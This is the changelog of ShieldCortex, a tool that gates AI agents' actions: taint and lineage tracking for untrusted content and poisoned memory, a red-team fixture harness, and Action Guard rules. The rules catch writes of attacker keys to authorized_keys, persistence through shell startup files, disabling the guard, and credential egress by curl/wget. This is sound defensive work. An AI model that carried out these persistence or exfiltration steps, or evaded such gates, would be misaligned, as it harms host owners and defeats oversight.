...
### Added
- **#598 ADR-002 §2.1/§2.2 — the taint and lineage contract as a pure core, unwired.** `src/defence/iron-dome/session-taint-lineage.ts` gives the ADR's contract an exact, tested shape without putting it in the effect plane: a span's band is derived from its provenance label by a fixed mapping over the existing `ProvenanceLabel` vocabulary, and a label that is absent, not a string, `unknown` or not a recognised member is `untrusted-external` for taint (fail-closed — which is also what stops a span naming its own band: `operator` is not a label). `operator` is reachable only from a host-attested `user`/`cli` and `signed-peer` only from a host-verified signature; a declared flag is a claim inside content. A span taints when its band is `untrusted-external` or when its content lineage is external whatever the transport (a signed peer relaying hostile material, a tool result proxying a fetch, a return from a tainted session). The store is keyed by a `SessionIdentity` that states who asserted the id — a content-asserted identity is refused at every entry point and never keyed — has no `clear`, no `reset` and no TTL, is released only when the host reports the session's end, and is inherited by forks and spawns, by memory written from a tainted session and later recalled (`stored-memory` band, the one band no label can claim) and by peer returns whose session is tainted in the store. The lineage record names the span, band, route and origin session so a later HOLD is attributable to taint. Nothing is wired: no verdict changes, the detection-triggered `plugins/openclaw/session-taint.ts` (#233) is untouched, and §8's operator decision on the taint trade is not pre-empted. Exported from `src/defence/index.ts` so the §5B taint controls and a later wiring PR reach one implementation.
  - **Review closures (#599 r1, three contract blockers):** *(1) lifecycle:* ending a session now RETIRES its record instead of deleting it — a tainted session's snapshot is kept, so a peer return delivered after the peer ended, a memory written after the writer ended and a spawn recorded after the parent ended all still carry the taint; an ended session cannot be the SUBJECT of a new operation (ingest, inherit-into, receive, recall are refused `session-ended`, never silently clean); `state()` reports `ended`; `endedSize()` counts retained snapshots (unbounded by design — eviction would be laundering). *(2) portable memory lineage:* `memoryWritten` returns a frozen, versioned `TaintMarker` for the adapter to store in the memory frame (#531); `memoryRecalled` takes the frame's `{ taint }` so a different instance, host or process consumes the same marker; a frame's explicit `taint: null` or a clean write through this store is *known-clean*; anything else — no frame, an invalid marker, a marker for another reference — is *missing evidence* and fails closed (§2.1), with `evidence` on the outcome saying which; empty references are refused on recall as well as write; `memoryMarkers` hydrates a fresh instance; `isTaintMarker` validates storage on the way in. *(3) attribution:* every origin, lineage entry, state and marker handed out is a detached, frozen copy — a caller that rewrites `origin.band` or `lineage[i].spanId` changes nothing the store says afterwards, to a child or to a memory marker; the span object passed to `ingest` is not retained. Non-blocking: the inherit reason names the root cause once and no longer nests per generation; the header's "injected state" now means something.
- **#594 ADR-002 §5C — the `openclaw.sessions_spawn` contract is judged per host version; routine dispatch is quiet, a real schema move is loud.** The reviewed spawn contract in `tool-input-schema.ts` is now a table of measured revisions — 2026.8.1 (28 fields) and 2026.9.6 (33 fields), each measured from that release's shipped `dist` schema; the newer declares `expectsCompletionMessage`, `completionTarget`, `projectId`, `projectGitUrl` and `placement` in addition, and no measured field has been removed. Re-measuring 2026.8.1 from the released package corrected the hand-transcribed bag the guard had carried since 30 Aug: it listed `category` (an internal gateway mapping, never a declared input) and `timeoutSeconds` (another tool's field) and lacked `group`, so a legitimate `{ visible, group }` spawn was reported as drift at that release (Tars, #595 review). The OpenClaw plugin records the detected host version (`api.runtime.version`, else the install's `package.json`) with the guard at interceptor build; the revision that judges a call is selected from it — `exact`, `floor` (host between measurements: nearest older revision), `beyond` (host newer than every measurement: newest revision), `below`, or `unknown-host` (no usable version: the union of measured revisions, never a guess). The drift observation and the one-line `CONTRACT DRIFT` warning carry the judging revision and the selection reason, so a dropped key on a host newer than the newest measurement reads as "re-measure the host" rather than as noise. Ordinary coordinator dispatch (which sets `expectsCompletionMessage`) drops zero keys at the current release and no longer writes a warning per call. Unknown-field reporting is preserved at every selection: a field no measured host declares is still dropped and reported, a field a revision does not declare is reported at that revision (no measured release has removed a field yet; the record pins that), and an evidence key (`command`, `argv`, …) stays fail-closed whatever the host version. `scripts/native-contracts/openclaw-sessions-spawn.json` is the measurement record and `scripts/measure-native-contract.mjs --root <openclaw install>` regenerates a revision from a host's shipped schema (`--check` verifies an install against the record; both `.mjs` and the older `.js` bundle shapes are located, and the `const schema = {` anchor is bound to the builder's own body so a delegating builder is refused rather than another function's literal measured); a test pins the TypeScript table to the record and requires every revision to be dist-measured, so the contract cannot be hand-widened or transcribed without a measurement landing first. No verdict changes: whichever revision judges a call, an undeclared key is dropped and reported and nothing is denied that was allowed or allowed that was denied. The measurer refuses a spread whose expression does not END at the name or gated block (`...NAME && {…}`, `...NAME.member`, `...NAME ?? …`, `...NAME()`, `…? {…} : {…} || …`): those are reported as unresolved and the named object's own fields are withheld, so a schema move hidden behind an operator can never be recorded as the bare named set (Tars, #595 review).
- **#590 ADR-002 harness — the §5B acceptance bars are pre-registered in the fixture repository.** `scripts/guard-effect-fixtures/preregistration.json` records the four bars as the ADR states them (witnessed attack blocking ≥ 90%, unintended blocking of legitimate work ≤ 2%, legitimate completion along the approval path ≥ 98%, ZERO successes in each of the four regression families), the fixture revision (sha256 over the canonical identity of every registered fixture), the policy revision (sha256 over the three gate sets), the frozen denominators, the regression-family assignment per attack fixture and the three families that have no fixture yet with the reason. Every Half B run checks the record against the live registry and policy sets and reports `registered` (verdicts issued), `exploratory` (something drifted or no record; values shown, no verdict counts toward §2.5) or `unmeasured` (not-run mode); an INVALID run carries no bars. Per arm the report now shows each bar beside its measured value, each regression family with its own denominator (a family with no fixture is "not run — never a pass", never omitted), and — side by side, as §5B requires — completion with the approval path answering yes, completion with no approval path, and prompts per completed task; a HELD legitimate fixture counts as completed with one prompt, never as blocking. Model-only decisions stay in their own bucket and never enter a bar. Disclosed: the "proposed policy" arm is approximated by `broad-floor` (the §2.4 DENY set plus its taint-independent HOLD set); the DENY/HOLD split and the taint-dependent HOLD row are not modelled until sequence step 5; the taint-controls family stays blocked on step 5 (#571). Harness scripts, tests and README only — no product code, no policy change, no rates quoted, no Guard configuration.
  - **#590 review (r1):** `assessBars` now also checks the run itself, not just the record — a witness-unproven attack, a dropped/duplicated fixture row, a row whose id is not in the registry, or a per-family executable count that no longer equals the record's frozen family denominator (named `run:family-shortfall:<family>:<observed>/<expected>`) demotes an otherwise-`registered` run to `exploratory` with every reason named in the report (frozen denominators were being read off the registry, so a shrunk or mismatched executed set could still render `met`/`not-met`). Separately, a malformed or partially-deleted pre-registration record (`bars` missing, any one of the four bars missing, or `bars`/`families`/`notRun` of the wrong type) now renders its EXPLORATORY section through a shape-safe bars fallback instead of throwing a `TypeError` out of `assessArm`. From the patrol review: the four §5B comparators are pinned in code (`ADR_BARS`) and a record whose comparator or threshold differs is a record problem (`record:bar-not-adr:<bar>:<op><threshold>`, EXPLORATORY, `--check` exit 2) — the freeze now covers the bars themselves, not only the revisions; and the three aggregate bars go UNMEASURED, exactly as the family bar already did, whenever a row in their denominator was not observed (an ungated attack with no effect observation, an ungated legit fixture with no completion observation, a HELD legit fixture with no no-guard observation) — 9 blocked + 1 unobserved is not ≥ 90%, 0 blocked + 1 unobserved is not ≤ 2%.

### Fixed
- **#505 Action Guard:** the user-home persistence set an agent actually controls is now a sensitive write target. (1) The SSH directory is recognised behind every home root (`~`, `$HOME`, `/home/<user>`, `/root`, `/Users/<user>`) and `authorized_keys` wherever it sits as a path segment — before, only the literal `~/.ssh` spelling gated, so a Write of an attacker key to `/home/<user>/.ssh/authorized_keys` was allowed while the same write to `/etc/sudoers.d/` was caught. Same `touch-sensitive-path` signal and tier as before. (2) A login/interactive shell startup file (`.bashrc`, `.zshrc`, `.profile`, `.bash_profile`, the zsh set, fish's `config.fish`) is gated on the **target**: a Write/Edit to one, or a shell write shape onto one (a redirect including noclobber `>|`; `tee` with any option run or earlier operand — `-a`, `--append`, `--`, `/tmp/log`; `sed -i`/`--in-place` including suffix forms and combined short clusters such as `-Ei`; `cp`/`mv`/`install` with it as the last operand), requires approval with the new `modify-shell-startup` signal — a PATH prepend carries no dangerous verb, so the content scan alone (#93) let it through. Reading or sourcing a startup file is untouched; the content scan still runs first, so a catastrophic line in one still hard-blocks. The tool-write target gate is ported to all three outage fallbacks (Claude Code hook, OpenClaw interceptor, Hermes client): a write-family tool naming a startup file under a path key gates while degraded, a read-family tool on the same path does not. The shell write shape is judged on the exec surface only. The write-content scan does not run this row, so a written script that appends to a startup file is not gated at write time. It is gated when it runs, because the folded-script scan reads its source. The write-time gap, and the known `tee`-operand and JS template-literal edge cases, are tracked in #588. On the exec surface a backslash-newline continuation is not a statement boundary (`tee -a \\` + newline + `~/.bashrc` gates); a plain newline is. (3) `~/.openclaw/openclaw.json` — the OpenClaw plane's equivalent of `~/.claude/settings.json`, where the ShieldCortex plugin is enabled — carries the same `disable-action-guard` path rule and the same read-only carve-out; `.claude/settings.json` on the Write path was already gated by #501 and is now pinned by a test. The new signal is mirrored on both outage fallback tables and the Hermes client, and named on operator-notify / denial rows. Not in scope: system-wide startup files under `/etc` (root-owned; `sudo` already gates), and other agents' config files.
- **#517 (3) the denial record carries its evidence.** Every `~/.shieldcortex/denials.jsonl` row the Claude Code hook writes (the pending row and the final row of an event, same `actionId`) now carries `matches: [{ signal, ... }]` — the rule that fired and what it is safe to say about the command it matched, which the interactive block message already printed as `rule:` / `matched:` and the durable record then threw away. The guard core has returned this since #192 and the OpenClaw interceptor already persists it; this is the hook plane catching up, not a new evidence source. Five review rounds shaped what "safe to say" means. r1–r3 tried to make the matched text safe to KEEP — collapse, bound, run a credential redactor over it, tokenise it like a shell would — and each round closed one credential shape and review found the next. r4 stopped keeping the text and persisted a PROJECTION of it instead (`verb`, `hosts`, `flags`, read off the tokens by an allow-list of shapes); review showed that was still input persistence under new JSON keys — a password that happened to begin with `--` was persisted as a flag name and a URL-shaped password contributed its hostname, through the real core and hook, on both rows. A character grammar says what a value is spelled like, never whether it was a credential argument. r5 removed hosts, flags and basenames but kept `verb` — argv[0] looked up in a table in the hook — which is still a string selected by the input through a mechanism the next round could ask to widen. r6 takes the reviewer's descope whole, and closes the class by construction: NO string on a match row is derived from, or chosen by, the input. `signal` is a rule name from the hook's `SAFE_SIGNALS` table — the one place a row says what kind of thing matched, in the guard's own vocabulary; `spanWithheld: 'command-text'` is a constant on every row that had a command-derived span (the span itself is never persisted, verbatim, redacted, projected or looked up); `argc` is a token count capped at 256; `pipe` (a `|` outside quotes and not backslash-escaped — a pipe operator is present, named for exactly what is tested, replacing r4's over-claiming `pipeToShell`) and `subshell` (`$(` or a backtick outside single quotes) are booleans. There is no `verb`, `hosts`, `flags` or basename field at all. `secret-egress` and `credential-access` still contribute nothing beyond the rule name, whatever the core sent. Provenance (`source`, `chain`, #184) is a path, and a path is input — `/tmp/<token>.sh` is one — so none of it persists, not even a basename: the row carries `provenanceWithheld: 'path'`, `chainDepth` (a capped count of fold-chain components) and `line` (an integer, clamped to 262 144 — the core never folds a longer script). The credential redactor from `dist/defence/credential-leak` is not on this path at all — there is no free-text field for it to run over, so the row is identical whether that module is absent, present, or throws. The raw command is still not persisted (`surface` unchanged, #284 Face 1) and the realtime audit row on this plane is unchanged, so terminal audit rows still carry no command text. The test suite pins the closed vocabulary structurally (every string on every row is a rule name or one of the two constants; every number a bounded integer; every boolean one of the two shape flags) across a property sweep of credential-bearing shapes, across twelve non-credential rule families with a secret and a well-known argv[0] in the span, and through the real built hook and core for both r4-review reproductions. Readers of `denials.jsonl` (`guard-policy-replay.mjs`, the cron denial audit) read fields they do not know permissively; verified against their parsers, not assumed.
- **#587 (#586 review follow-ups, hook denial-evidence sink):** four non-blocking nits from the r6 review, none reopening the parser/redactor question. (1) `pipe` no longer over-claims: it is set only when a `|` sits in an unquoted, unescaped run of the span — where the shell reads an operator — so `grep "a|b"`, `grep 'a|b'`, `grep a'|'b` and `grep a\|b` leave it unset while a bare or glued `|` still sets it; the tokeniser grammar is unchanged, it now records which runs were bare instead of only the decoded value. (2) The 8192-character projection cap is applied to the ORIGINAL span before the trim, so it bounds every operation on the input rather than only the tokenisation; the comment says so. (3) The suite's closed-vocabulary invariant pins exact `SAFE_SIGNALS` membership (via the shared log schema's vocabulary, cross-checked against the hook's source) instead of a character grammar, so a rule name that merely looks like a signal fails loudly; the redaction marker is rejected as a match-row signal. (4) `line` is clamped to 262 144 for symmetry with `argc` / `chainDepth` — hygiene, not privacy: a bounded integer carries no input either way.
...
### Fixed
- **#574 `update` refreshes the installed OpenClaw hook.** `~/.openclaw/hooks/cortex-memory/` is installed by file copy, so upgrading the npm package used to leave the previous `handler.ts` / `runtime.mjs` running until an operator noticed doctor's staleness warning and re-ran `shieldcortex openclaw install`. `update` now has an **OpenClaw hook** step that re-copies any installed copy that differs from the packaged source (`refreshed` / `current` / `not installed` / warn), decided by the same `hookFilesStale` comparator doctor's row uses. It never creates a hook that was not installed, never touches the plugin registry, and never restarts the gateway — the gateway imports the handler once at start-up, so the step says a restart is what loads the new files. The refresh is **all-or-nothing**: the complete file set is staged in `~/.openclaw/.shieldcortex-hook-staging-*` (outside `hooks/`, which is the only directory OpenClaw enumerates hooks from), `fsync`ed, verified byte-for-byte against the package, and published through the swap below; the previous set goes to `<configRoot>/backups/cortex-memory-preupdate-*`. A failure before the first `rename(2)` leaves the working set exactly where it was; a failure BETWEEN the two renames leaves the host with no installed hook, and that is reported rather than repaired (see below). The installer's first-install copy is unchanged — it writes into a directory nothing is loading yet, so it has no window to lose.
- **#576 `update` refreshes the installed Hermes plugin copy.** `~/.hermes/plugins/shieldcortex` is a file copy too; after 5.1.0 → 5.2.0 its `__init__.py` differed and `shadow.py` was missing entirely, so the gateway kept running the old `pre_tool_call` gate. The new **Hermes plugin** step refreshes only the copy Hermes' own discovery (#569) says each root loads, and only when that scan is complete and unambiguous — an undetermined scan, an unreadable root, shadowing copies, a symlink in any discovered copy, or a project plugin in play writes nothing and points at `shieldcortex doctor --fix-hermes-plugin-copies` / `shieldcortex hermes install`. New bytes are staged OUTSIDE the plugins root (a staged `plugin.yaml` under `plugins/` would itself be a #569 shadowing copy) and swapped in; the previous copy is moved to `<hermesHome>/backups/`, never deleted, and restored if the swap fails. The gateway is never restarted — the step says it must be.
- **#576 doctor: a Hermes plugin freshness row.** `Hermes plugin` WARNs when the copy Hermes loads differs from the packaged source, naming the files and the fix (`shieldcortex hermes install` + a gateway restart), mirroring the `OpenClaw hook` row. It never FAILs — it is WARN only, so exit 0 unless `--strict`, which escalates every ⚠️ by design — and it stays INFO wherever the `Hermes plugin copies` row already owns the remedy (no discovery, an unreadable root, more than one copy in play). `update` and `doctor` decide staleness with the same function, over exactly the file set `hermes install` copies.
- **#574 #576 a crash mid-swap is REPORTED, never repaired.** Replacing an installed directory is two `rename(2)` calls — `target → backups/`, then `staged → target` — and Node has no atomic directory exchange to do it in one (no `renameat2(RENAME_EXCHANGE)` binding). A SIGKILL, a power cut or an OOM between them leaves the host with NO installed copy. Earlier drafts of this work tried to finish that swap on the next run — first from an on-disk journal, then from "the target is missing **and** a `backups/<name>-preupdate-*` exists for this root". Neither is sound: a journal names paths a recovery then moves, and a backup directory is also exactly what a SUCCESSFUL refresh leaves behind, so healing from one reinstalls an integration the operator has just uninstalled (and a planted empty `backups/shieldcortex-preupdate-x` installs it on a host that never had it). There is no healing. `update` refreshes copies that EXIST and are stale, and never creates one that is absent — the publication routine has no install branch at all, so an absent target refuses rather than being written into, and both refreshers re-ask "is it still installed, is it still stale" AFTER they hold the root's lock (discovery runs before the lock, so everything it decided is a claim about a tree the lock does not yet protect: two refreshers interleaved could otherwise have one recreate what the other had just left absent). A swap that fails after the first rename says so **at that moment**, naming the backup it left and `shieldcortex hermes install` / `shieldcortex openclaw install` to put the packaged set back. A process KILLED between the two renames reaches no reporting at all, so the same three facts — the target, the exact backup path, the installer command — are written to stderr with `fs.writeSync(2, …)` BEFORE the displacing rename; that line is the only thing that survives a `SIGKILL`, and it is proved by a spawned child that kills itself the instant the first rename returns. Backups are never read, moved or deleted. Doctor has no interrupted-refresh row, because with no stored marker it could not tell that state from a deliberate uninstall. A directory that merely exists is still not an install, and a target that fails byte-verification is still refreshed rather than skipped.
- **#574 #576 the whole write path is preflighted for symlinks.** The round-1 preflight walked the CONTENTS of every discovered plugin directory (the #569 question) and never lstat'd the directories being written THROUGH, so a symlinked `<hermesHome>/backups`, a symlinked plugins root or a symlinked `HERMES_HOME` was followed. Every component of every write path — the plugins root and its ancestors up to the Hermes tree, the target, `backups/` and the staging parent — is now checked before the first write, and staging and backups are proved to be outside EVERY root the probe returned rather than just the one being refreshed. The OpenClaw side checks `hooks/`, the hook directory and `backups/` the same way. Every refresh publication goes through one call, so no path can skip the preflight. A link, or a component that cannot be read, writes nothing. The `--fix-hermes-plugin-copies` repair semantics are unchanged.
- **#574 #576 staged bytes and backup names are durable before they are reachable.** Every staged file is `fsync`ed, then every staged directory bottom-up, before the first rename makes the tree reachable; the backup's newly created ancestry (the reservation, `backups/` and the integration root) is flushed immediately before the target is displaced, so the rename that empties `plugins/` cannot reach the medium ahead of the name that will hold the old copy; both parent directories are flushed after each rename. A file that will not flush refuses the publication outright — nothing has been written yet, so refusing costs a warning while publishing bytes that may not survive a power cut costs the gate. A platform that cannot flush a directory fd at all (Windows, some filesystems: `EINVAL`, `ENOTSUP`, `EISDIR`) is reported in the step's detail and carried on with; a device that is asked and refuses (`EIO`, `ENOSPC`) is a real failure — fatal before the first rename, with nothing moved. AFTER a rename there is nothing left to abort, so both parent directories are still attempted (neither is skipped because the other refused) and the refusal is reported as **refreshed, durability not confirmed**: a degraded refresh, counted as attention and a non-zero exit, not as a clean one.
- **#574 #576 one writer per integration root, and nothing reclaims a lock.** `<root>/.shieldcortex-update.lock` (`O_CREAT|O_EXCL|O_NOFOLLOW`, holding the pid, a timestamp and a random token) is taken for EVERY root a command may write in, before its first write, and held across all of that root's writes — by `update`'s two refresh steps and by `shieldcortex hermes install` / `shieldcortex openclaw install`, including the OpenClaw installer's `hooks/` creation, `openclaw.json` cleanup, plugin install and gateway restart. Every named writer participates: `update`'s two refresh steps, its OpenClaw **plugin** step (which deletes the legacy `extensions/shieldcortex-realtime` directory and then hands the native installer the same root — previously unlocked, so `update` could delete an extension `openclaw install` was copying into), `shieldcortex hermes install` / `shieldcortex openclaw install` including the OpenClaw installer's `hooks/` creation, `openclaw.json` cleanup, plugin install and gateway restart, and `doctor --fix-hermes-plugin-copies`, which now plans twice — a first pass that writes nothing and only names the roots it would move out of plus the root its `backups/` is in, then the locks (taken in sorted order so two doctors cannot deadlock), then the plan REBUILT under those locks, and only that plan executed. A busy root is skipped whole: it is named, nothing at all is written in it, the other roots carry on where that is safe (doctor's repair is one plan, so a busy lock there moves nothing anywhere), and the command exits non-zero. `update` exits non-zero on any host-integration work it did not finish — a busy root, a copy it could not publish, one that vanished mid-swap, a durability the device refused — and calls that run INCOMPLETE rather than FAILED, since the upgrade itself landed; `hermes install` and `openclaw install` exit 1 when any root was busy or refused, rather than only when every one of them was. Nothing deletes an existing lock: an earlier draft cleared one whose pid was dead and whose stamp was over ten minutes old, which races two contenders into deleting each other's live lock, and the ten-minute promise was false anyway (a kill between the exclusive create and the write leaves a record no age check clears). The refusal names the file, reports the pid and time it holds, and says to remove it only once you know nothing is running. `release()` deletes only the file still carrying its own token.
- **#576 a Hermes refresh writes each root under that root's own lock.** Hermes discovers several plugin roots at once — the default home and every profile under it — so one `HERMES_HOME=…/profiles/work` refresh sees all of them. Every target is now published under the lock of the root that OWNS it and displaced into that root's own `backups/`. Previously a profile refresh rewrote the default root's plugin while `hermes install` held the default root's lock, and a default-home run could move a profile's plugin into the wrong tree, where the restore could not find it again.
- **#574 #576 the hook and plugin install paths never write through a symlinked destination.** Both installers overlay the packaged set file by file, and `mkdirSync`/`copyFileSync` follow a link at the destination — so a symlink at `plugins/shieldcortex/shadow.py`, at `hooks/cortex-memory/runtime.mjs`, or at the plugin directory itself made an install truncate a file elsewhere on the box. Every leaf about to be written is `lstat`ed and a link refuses that install, as do the path components between the integration root and the destination. On the OpenClaw side the check covers everything the hook install touches BEFORE its first `mkdir`, copy or `rm` in a config root — `hooks/`, `hooks/internal/`, the destination `hooks/cortex-memory/`, and the legacy layouts `hooks/shieldcortex/` and `hooks/internal/cortex-memory/` that the install DELETES — because a linked `hooks/` made the installer overwrite an external `handler.ts` and remove an external `shieldcortex/` while reporting success. A link, or a component that cannot be read, drops that config root whole: nothing written, nothing deleted, exit 1. A symlinked `~/.hermes` / `~/.openclaw` / profile root is refused by the lock's own preflight, before even the lock file is created. **Scope, stated plainly:** what is audited for linked destinations in this release is the refresh path (both integrations) and the hook/plugin install paths named above. The OpenClaw installer's OTHER copy paths — the `extensions/` directory and the `openclaw.json` snapshot — are NOT audited, and a follow-up issue will be filed for them.
- **#574 #576 `update` resolves the host homes through the shared resolvers.** `runUpdate` handed `os.homedir()` to both host-refresh steps, which bypassed OpenClaw's `OPENCLAW_HOME` / `SUDO_USER` resolution: with `HOME=A` and `OPENCLAW_HOME=B` it refreshed A while doctor kept warning about B, and under `sudo` it refreshed root's tree. The steps now take no positional home — the OpenClaw one resolves through the same function `defaultHookDestDir()` uses, and the Hermes one through a shared `SUDO_USER`-aware resolver (`HERMES_HOME` still travels unexpanded to Hermes' own discovery, per #569 r5).
- **#536 doctor no longer says Guard off while the Claude Code hook is denying.** The HOSTS headline was hardcoded `Guard off`, and `liveGating` only looked at the OpenClaw plugin flags, so a host with signed Enforce, OpenClaw `enforce: false`, and a live Claude Code PreToolUse hook still printed Guard off, WARNed the policy lock ("this is not unprotected"), and WARNed NOTIFY. Doctor now treats a wired Claude Code ShieldCortex PreToolUse hook plus signed Enforce as a live plane: the headline becomes `Guard on` or `Guard mixed`, an unlocked policy lock FAILs, and a missing denial-capable webhook FAILs. Leftover signed Enforce with the plugin off and Claude unwired stays WARN (the 5.0.6 leftover-Enforce case). Does not enable Guard. Does not prescribe `--action-guard-enable`.
- **#577 a help flag no longer runs the command.** `shieldcortex update --help` performed the whole upgrade on 5.1.0 (global npm install, re-exec, hook rewrites, plugin reinstall) and printed no usage — the dispatcher handed `update` straight to `runUpdate()`, which only ever looked for `--force`/`-f`/`--verbose` deep inside itself, so `--help`, `-h` and every typo meant "upgrade". `update` now parses its arguments once at the entry point: `--help`/`-h` prints usage listing every flag and env switch it honours and exits 0 before the registry lookup or any write, an unknown flag or extra positional prints the error plus usage on stderr and exits 2, and the parsed options are passed into `runUpdate` instead of being re-read from `process.argv` mid-flow. The same gate (`src/cli/help-gate.ts`) now fronts `repair`, `migrate`, `uninstall`, `hermes <verb>`, `openclaw <verb>`, `memories <verb>` (including `prune` and `migrate-legacy`), `sessions prune` and `vacuum`/`compact`, every one of which previously mutated, opened the database or prompted instead of printing usage. The shared npx-staleness preamble, which shells out to `npm ls -g` before every subcommand, is skipped on a help request too, so `update --help` now creates no files at all. Two follow-ups from review: the strict allow-lists cover the whole call graph's arguments rather than each command's own function body — `--allow-conversation-access` (#226), read by the plugin reconcile several modules below `update` and `repair`, is now accepted, documented and threaded through as a parsed option instead of a deep `process.argv` read — and the help detector distinguishes the help verb from an option's VALUE, so `openclaw skill install --agent help`, `memories prune --project help` and `memories migrate-legacy --source help` do the work they name instead of silently printing usage. Invalid arguments are also rejected before the staleness preamble runs, so every bad-argument path exits 2 without spawning a process or writing a byte under `$HOME`.
- **#573 the repair log follows the database it describes, and is settled before the repair runs:** `memories repair-project-keys --execute` wrote its per-rewrite JSON log to `os.homedir()/.shieldcortex/logs/` no matter which database it had repaired, while the safety backup beside it correctly followed the DB. Every run against a throwaway database — a test, a probe, `--db <tmp>` — therefore left a permanent file in the operator's real home describing a database that no longer existed; all 3,508 on the reporting host were of that kind, and not one recorded a real repair. The log is now written to `<db-dir>/logs/`, which for the default DB is exactly the documented `~/.shieldcortex/logs/`. That destination is also resolved, created and proved writable **before** the database is modified: a regular file or a symlink at `<db-dir>/logs` used to throw with the rewrite already committed and no log anywhere, and a `logs` pointed at the realtime audit directory made the repair write into the audit plane. A refusal now means the repair never ran and nothing changed. The destination is `realpath(<db-dir>)/logs`, resolved in full, so no symlink in any ancestor decides where the record lands — a `HOME/db-link` pointing at `.shieldcortex/audit` used to put the record inside the audit plane, and a path check that picked its trusted root by basename never looked above the link. The record itself is created with `O_CREAT|O_EXCL`, so a preplanted symlink carrying its name is never followed — that shape previously overwrote a realtime audit file with repair JSON. If the write fails after the commit (disk full), the error names the row count, the database and the backup path, and exits non-zero; it is never silent.
- **#573 doctor's DISK row reports what it measured, and prescribes only what a measurement supports:** the breakdown splits the `logs` lump into `audit` / `repair` / `other` and reports how much of the database is free pages (`freelist_count × page_size`). The live incident read `DB 54.2 MB · logs 41.4 MB` and offered only memory deletion. The row no longer tries to work out which ROWS fill the database: every version that did — a file-size heuristic, then `dbstat` page sums over `memories`, its indexes and an FTS5 index's shadow tables — produced a new confidently wrong "delete your memories", most recently on a database that was 95% already-free pages and on one whose FTS5 index declared `content=memories_backup`. It now names a command in exactly two cases: `shieldcortex logs prune` when the repair logs are at least half the measured footprint, and `shieldcortex vacuum` when free pages are at least 20% of the database's pages (below that the command rewrites the whole file to reclaim a rounding error). An audit-dominated directory is named as such, with #579, and no command. Anything else reports the sizes and asks you to inspect before removing anything. `memories prune`, `memories dedupe` and `sessions prune` are no longer reachable from this row at all, and the old blanket "these five directories are safe to rotate or clear" instruction — which covered `state/` and `quarantine/`, and was offered to a directory holding one state file and no database — is gone.

**Not in this release:** retention for the realtime audit logs under `~/.shieldcortex/audit/`. Those are an unread projector queue with concurrent writers and stop-hook recovery reading them, so bounding them safely is separate work — tracked in #579. Nothing here compresses, deletes or rewrites an audit file, and doctor says so plainly when the audit plane is the largest consumer.

## [5.2.0] - 2026-09-24

Minor on 5.1.0. Action Guard stays off by default. Node floor unchanged (`^22.14.0 || >=24.0.0`). Cloud pin stays `^5.0.0`.

**Two things to know before you upgrade:**
- **Stored Review Copilot annotations are rewritten once (#538).** On first start, a one-time migration runs existing `quarantine_annotations` rows through the write-time redactor, and records rows scanned and rows redacted in the `quarantine_annotations_backfill` marker table. Annotations are derived data the judge regenerates; `quarantine.original_content` is not rewritten. `SHIELDCORTEX_PII_REDACTION=off` keeps storing verbatim.
- **`shieldcortex doctor` has a new Hermes row and a new flag (#569).** It asks Hermes' own discovery which `shieldcortex` plugin copy each Hermes plugin root actually loads, and warns when a backup (for example `~/.hermes/plugins/shieldcortex.bak-*`) is shadowing the installed plugin. `--fix-hermes-plugin-copies` moves (never deletes) such copies into `<hermesHome>/backups/`, and refuses whenever the layout is ambiguous. The row is WARN-only: it does not change doctor's exit code.

Also in this release: MCP tools that echo stored memory carry the untrusted-data frame (#535); a credential read sent to a scheme-less curl/wget target counts as external egress (#566); doctor's denial-capable-sink test matches what the notify transport accepts (#517 c); audit report fixes (#547).
...
- **#547 docs:** `docs/openclaw-integration.md` lists the framed recall surfaces and says the frame is guidance to the model, not enforcement.
...
### Fixed
- **#538 (1) Review Copilot annotations are redacted at write:** `quarantine_annotations` is now a persistence boundary like memories, `session_events` and `quarantine` (#510). The judge's output — the verbatim `evidence[].snippet` spans of the quarantined text, and the `summary`, `reasoning` and `similarGroupKey` it composed from them — goes through the write-time redactor before the INSERT, so a quarantine row that holds an identifier (a legacy row stored raw before #510, or one the model paraphrased) no longer lands in a second table that the admin quarantine listing, `GET /quarantine/:id/annotation` and `getAnnotationForItem` all read. Second pass specific to this boundary: the model tends to re-quote an identifier without its label (`Identifier QQ123456C quoted verbatim`), which the #510 detector alone does not claim (residual (1): unlabelled), so every identifier value the detector found labelled anywhere in the annotation — the evidence snippet is verbatim source text, so the labelled form is almost always present — is scrubbed by exact match from every other free-text field; an identifier the model reformatted (spaces, case) is a disclosed residual, as for memories. The `similar_group_key` column is written from the redacted object, so grouping and JSON agree; `category`, `suggested_action`, `confidence`, `copilot_version` and the stamps are untouched; the annotate endpoints return the stored (redacted) form. `SHIELDCORTEX_PII_REDACTION=off` stores verbatim, as for memories. Existing rows: a one-time startup backfill rewrites `quarantine_annotations` written before this change through the same redactor (annotations are derived, regenerable data), guarded by the `quarantine_annotations_backfill` marker table, which records rows scanned and rows redacted; already-clean rows are not rewritten, a row whose JSON does not parse is left alone, and a lost marker costs one scan. **Decision recorded, not changed here:** legacy `quarantine.original_content` stored raw is NOT rewritten in place — it is the operator's review evidence and follows #534's "redacted as it moves" rule (dashboard→quarantine and approval→memory already redact); whether to backfill it stays open on #538. The Review Copilot model itself still sees the raw row in-process; nothing about that read is persisted.
- **#569 doctor detects shadowing Hermes plugin copies:** Hermes keys plugins on the manifest `name:`, not the folder, and on a same-source collision the last directory in sorted order wins silently, so a backup such as `plugins/shieldcortex.bak-*` loads instead of the installed plugin. `shieldcortex doctor` now asks Hermes' own discovery which copy each plugin root (default home, `HERMES_HOME`, every profile, and the project directory when `HERMES_ENABLE_PROJECT_PLUGINS` is on) actually loads, and warns when it is not the installed copy. `--fix-hermes-plugin-copies` moves (never deletes) shadowing copies into `<hermesHome>/backups/` after an all-or-nothing preflight; it refuses symlinked layouts, cross-filesystem moves, roots with no canonical copy and project-sourced copies. Anything it cannot read or enumerate is reported as undetermined, never clean, and without a reachable Hermes interpreter it says it cannot tell rather than guessing. The installer and the Hermes plugin's startup print the same warning.
- **#535 recall echo paths:** MCP tools that echo stored memory because the agent asked for it now carry the same untrusted-data frame as recall. Prose tools (`remember`, `forget` when it lists titles, consolidation previews that list titles, contradictions, `quarantine_review` list, `scan_memories` findings) wrap through `framedRecall`. `export_memories` is now a JSON document with `untrusted_data_notice` and `frame_id` as the first keys (it used to be `Exported N memories:` plus a raw array — that prefix was already not parseable JSON). Graph query/entities/explain success payloads get the same fields. Empty and error results stay unframed. The frame is still guidance, not enforcement.
